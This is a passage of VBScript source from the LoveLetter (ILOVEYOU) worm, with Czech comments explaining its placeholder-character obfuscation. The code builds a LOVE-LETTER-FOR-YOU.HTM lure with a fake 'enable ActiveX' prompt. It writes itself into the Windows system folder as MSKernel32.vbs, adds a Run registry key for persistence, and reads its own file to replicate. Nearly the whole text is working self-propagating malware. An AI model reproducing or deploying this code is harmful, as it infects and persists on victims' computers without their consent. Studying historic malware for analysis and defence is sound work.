"        ]-]ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> ]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<?-?BODY><?-?HTML>]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<SCRIPT language=@-@JScript@-@>]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<!--?-??-?]-]&vbcrlf& _"&vbcrlf& _
"        ]-]if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}]-]&vbcrlf& _"&vbcrlf& _
"        ]-]?-??-?-->]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<?-?SCRIPT>]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<SCRIPT LANGUAGE=@-@VBScript@-@>]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<!--]-]&vbcrlf& _"&vbcrlf& _
"        ]-]on error resume next]-]&vbcrlf& _"&vbcrlf& _
"        ]-]dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit]-]&vbcrlf& _"&vbcrlf& _
"        ]-]aw=1]-]&vbcrlf& _"&vbcrlf& _
"        ]-]code=]-]"&vbcrlf& _
"  [-[ "&vbcrlf& _
"  [-[ tímto bude HTML konèit"&vbcrlf& _
"  [-["&vbcrlf& _
"  dta2= ]-]set fso=CreateObject(@-@Scripting.FileSystemObject@-@)]-]&vbcrlf& _"&vbcrlf& _
"        ]-]set dirsystem=fso.GetSpecialFolder(1)]-]&vbcrlf& _"&vbcrlf& _
"        ]-]code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))]-]&vbcrlf& _"&vbcrlf& _
"        ]-]code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))]-]&vbcrlf& _"&vbcrlf& _
"        ]-]code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))]-]&vbcrlf& _"&vbcrlf& _
"        ]-]set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)]-]&vbcrlf& _"&vbcrlf& _
"        ]-]wri.write code4]-]&vbcrlf& _"&vbcrlf& _
"        ]-]wri.close]-]&vbcrlf& _"&vbcrlf& _
"        ]-]if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then]-]&vbcrlf& _"&vbcrlf& _
"        ]-]if (err.number=424) then]-]&vbcrlf& _"&vbcrlf& _
"        ]-]aw=0]-]&vbcrlf& _"&vbcrlf& _
"        ]-]end if]-]&vbcrlf& _"&vbcrlf& _
"        ]-]if (aw=1) then]-]&vbcrlf& _"&vbcrlf& _
"        ]-]document.write @-@ERROR: can#-#t initialize ActiveX@-@]-]&vbcrlf& _"&vbcrlf& _
"        ]-]window.close]-]&vbcrlf& _"&vbcrlf& _
"        ]-]end if]-]&vbcrlf& _"&vbcrlf& _
"        ]-]end if]-]&vbcrlf& _"&vbcrlf& _
"        ]-]Set regedit = CreateObject(@-@WScript.Shell@-@)]-]&vbcrlf& _"&vbcrlf& _
"        ]-]regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@]-]&vbcrlf& _"&vbcrlf& _
"        ]-]?-??-?-->]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<?-?SCRIPT>]-]"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ #-# = apostrof"&vbcrlf& _
"  [-[ @-@ = úvozovky"&vbcrlf& _
"  [-[ ?-? = lomítko"&vbcrlf& _
"  [-[ ^-^ = obrácené lomítko"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ výsledkem této nesmyslné manipulace je dt5 a dt6"&vbcrlf& _
"  [-[ obsahující zaèátek a konec HTML "&vbcrlf& _
"  [-["&vbcrlf& _
"  dt1 = replace(dta1, chr(35) & chr(45) & chr(35), ]-][-[]-])"&vbcrlf& _
"  dt1 = replace(dt1, chr(64) & chr(45) & chr(64), ]-]]-]]-]]-])"&vbcrlf& _
"  dt4 = replace(dt1, chr(63) & chr(45) & chr(63), ]-]/]-])"&vbcrlf& _
"  dt5 = replace(dt4, chr(94) & chr(45) & chr(94), ]-]%-%]-])"&vbcrlf& _
"  dt2 = replace(dta2, chr(35) & chr(45) & chr(35), ]-][-[]-])"&vbcrlf& _
"  dt2 = replace(dt2, chr(64) & chr(45) & chr(64), ]-]]-]]-]]-])"&vbcrlf& _
"  dt3 = replace(dt2, chr(63) & chr(45) & chr(63), ]-]/]-])"&vbcrlf& _
"  dt6 = replace(dt3, chr(94) & chr(45) & chr(94), ]-]%-%]-])"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ naètení kompletního kódu viru"&vbcrlf& _
"  [-[ rozkouskování na jednotlivé øádky, poté zpracování"&vbcrlf& _
"  [-[ problematických znakù na pseudokódy"&vbcrlf& _
"  [-[ a pøevod na strukturu pøiøaditelnou do promìnné"&vbcrlf& _
"  [-["&vbcrlf& _
"  set fso = CreateObject(]-]Scripting.FileSystemObject]-])"&vbcrlf& _
"  set c = fso.OpenTextFile(WScript.ScriptFullName, 1)"&vbcrlf& _
"  lines = Split(c.ReadAll, vbcrlf)"&vbcrlf& _
"  l1 = ubound(lines)"&vbcrlf& _
"  for n = 0 to ubound(lines)"&vbcrlf& _
"    lines(n)=replace(lines(n), ]-][-[]-], chr(91) + chr(45) + chr(91))"&vbcrlf& _
"    lines(n)=replace(lines(n), ]-]]-]]-]]-], chr(93) + chr(45) + chr(93))"&vbcrlf& _
"    lines(n)=replace(lines(n), ]-]%-%]-], chr(37) + chr(45) + chr(37))"&vbcrlf& _
"    if (l1 = n) then"&vbcrlf& _
"      lines(n) = chr(34) + lines(n) + chr(34)"&vbcrlf& _
"    else"&vbcrlf& _
"      lines(n) = chr(34) + lines(n) + chr(34) & ]-]&vbcrlf& _]-]"&vbcrlf& _
"    end if"&vbcrlf& _
"  next"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ vytvoøení HTML souboru"&vbcrlf& _
"  [-["&vbcrlf& _
"  set b=fso.CreateTextFile(dirsystem + ]-]%-%LOVE-LETTER-FOR-YOU.HTM]-])"&vbcrlf& _
"  b.close"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ naplnìní HTML souboru"&vbcrlf& _
"  [-[ zapíše zaèátek (dt5), všechny øádky vlastního viru (pole lines)"&vbcrlf& _
"  [-[ a poté pochopitelnì konec (dt6)"&vbcrlf& _
"  [-["&vbcrlf& _
"  set d=fso.OpenTextFile(dirsystem + ]-]%-%LOVE-LETTER-FOR-YOU.HTM]-],2)"&vbcrlf& _
"  d.write dt5"&vbcrlf& _
"  d.write join(lines, vbcrlf)"&vbcrlf& _
"  d.write vbcrlf"&vbcrlf& _
"  d.write dt6"&vbcrlf& _
"  d.close"&vbcrlf& _
"end sub"&vbcrlf& _
""
set fso=CreateObject("Scripting.FileSystemObject")
set dirsystem=fso.GetSpecialFolder(1)
code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))
code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))
code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))
set wri=fso.CreateTextFile(dirsystem&"\MSKernel32.vbs")
wri.write code4
wri.close
if (fso.FileExists(dirsystem&"\MSKernel32.vbs")) then
if (err.number=424) then
aw=0
end if
if (aw=1) then
document.write "ERROR: can't initialize ActiveX"
window.close
end if
end if
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
//-->
</SCRIPT>